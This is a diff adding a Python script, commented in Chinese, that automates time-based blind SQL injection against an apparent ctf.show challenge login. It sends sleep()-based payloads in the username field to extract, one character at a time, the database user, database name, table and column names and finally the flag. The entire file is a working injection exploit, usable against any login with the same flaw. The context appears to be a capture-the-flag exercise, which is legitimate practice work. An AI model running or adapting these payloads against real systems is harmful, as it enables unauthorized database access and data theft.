@@ -1,0 +1,141 @@
+import requests
+from datetime import datetime
+import time
+import threading
+
+url = 'http://b485536d-9f94-441a-ba97-53f4fd363d26.chall.ctf.show'
+strs = '}abcdefghijklmnopqrstuvwxyz-{0123456789'
+
+# 盲注数据库用户名
+def get_database_user():
+	user = ''
+	payload = 'admin\' or if(ascii(substr((select user()),{},1))={},sleep(3),1)#-- '
+	print('[+] 开始盲注用户名')
+	for n in range(1,5):
+		for i in strs:
+			s = datetime.now()
+			data = {'password':'123',
+					'username':payload.format(str(n),ord(i))}
+			requests.post(url,data=data)
+			e = datetime.now()
+			if (e-s).seconds >= 2:
+				user = user + str(i)
+				print('[*] 成功盲注用户名第{}位，字符为{}'.format(str(n),str(i)))
+				break
+		time.sleep(0.5)
+	print('[+] 盲注用户名结束,数据库用户名为{}'.format(user))
+	return user
+
+#盲注数据库名称
+def get_database_name():
+	database = ''
+	payload = 'admin\' or if(ascii(substr((select database()),{},1))={},sleep(3),1)#-- '
+	print('[+] 开始盲注数据库名')
+	for n in range(1,5):
+		for i in strs:
+			s = datetime.now()
+			data = {'password':'123',
+					'username':payload.format(str(n),str(ord(i)))}
+			requests.post(url,data=data)
+			e = datetime.now()
+			if (e-s).seconds >= 2:
+				database = database + str(i)
+				print('[*] 成功盲注数据库名第{}位，字符为{}'.format(str(n),str(i)))
+				break
+		time.sleep(0.5)
+	print('[+] 盲注数据库名称结束,数据库名为{}'.format(database))
+	return database
+
+#查询数据库中表的数量
+def get_table_num(database_name):
+	table_num = 1
+	payload = 'a\' or if((select(count(*))from(information_schema.tables)where(table_schema=\'{}\'))={},sleep(3),1)#-- '
+	print('[+] 开始盲注表数量')
+	for n in range(1,5):
+		s = datetime.now()
+		data = {'password':'123',
+				'username':payload.format(database_name,str(n))
+				}
+		requests.post(url,data=data)
+		e = datetime.now()
+		if (e-s).seconds >= 2:
+			print('[*] 成功盲注数据库数量，有{}个表'.format(str(table_num)))
+			break
+		table_num = table_num + 1	
+		time.sleep(0.5)
+	print('[+] 盲注用户名结束,表数量为{}个'.format(str(table_num)))
+	return table_num
+
+
+#查询数据库所有表的名称
+def get_table_name(num,database):
+	table_name = ''
+	payload = 'admin\' or if(ascii(substr(((select(group_concat(table_name)) from(select(table_name)from(information_schema.tables)where(table_schema=\'{}\'))b)),{},1))={},sleep(3),1)#-- '
+	print('[+] 开始盲注所有的表名称')
+	for n in range(1,10):
+		for i in strs:
+			s = datetime.now()
+			data = {'password':'123',
+					'username':payload.format(database,str(n),str(ord(i)))
+					}
+			requests.post(url,data=data)
+			e = datetime.now()
+			if (e-s).seconds >= 2:
+				table_name = table_name + str(i)
+				print('[*] 成功盲注表名第{}位，字符为{}'.format(str(n),str(i)))
+				break
+		time.sleep(0.5)
+	print('[+] 盲注用户名结束,表名为{}'.format(table_name))
+	return table_name
+
+#查询表内所有列的名字
+def get_table_columns(table_name,length):
+	columns_name = ''
+	payload = 'admin\' or if(ascii(substr(((select(group_concat(column_name)) from(select(column_name)from(information_schema.columns)where(table_name=\'{}\'))b)),{},1))={},sleep(3),1)#-- '
+	print('[+] 开始盲注{}表所有列的名称'.format(table_name))
+	for n in range(1,length):
+		for i in range(0x20,0x7e):
+			s = datetime.now()
+			data = {'password':'123',
+					'username':payload.format(table_name,str(n),str(i))
+					}
+			requests.post(url,data=data)
+			e = datetime.now()
+			if (e-s).seconds >= 2:
+				columns_name = columns_name + str(chr(i))
+				print('[*] 成功盲注表{}列名第{}位，字符为{}'.format(table_name,str(n),str(chr(i))))
+				break
+		time.sleep(0.5)
+	print('[+] 盲注表{}列名结束,列名为{}'.format(table_name,columns_name))
+	return columns_name
+
+#读取flag
+def get_flag(table_name,table_column):
+	flag = ''
+	payload = 'admin\' or if(ascii(substr((select {} from {} limit 1),{},1))={},sleep(3),1)#-- '
+	print('[+] 开始盲注flag')
+	for n in range(1,48):
+		for i in strs:
+			s = datetime.now()
+			data = {'password':'123',
+					'username':payload.format(table_column,table_name,str(n),ord(i))}
+			requests.post(url,data=data)
+			e = datetime.now()
+			if (e-s).seconds >= 2:
+				flag = flag + str(i)
+				print('[*] 成功盲注flag第{}位，字符为{}'.format(str(n),str(i)))
+				break
+		time.sleep(0.5)
+	print('[+] 盲注用户名结束,flag为{}'.format(flag))
+	return flag
+
+if __name__ == '__main__':
+	user = get_database_user()
+	database = get_database_name()
+	table_num = get_table_num(database)
+	tables = get_table_name(table_num,database)
+	length = 5
+	table_name = 'flag'
+	table_column = 'flag'
+	flag = get_flag(table_name,table_column)
+	print(flag)
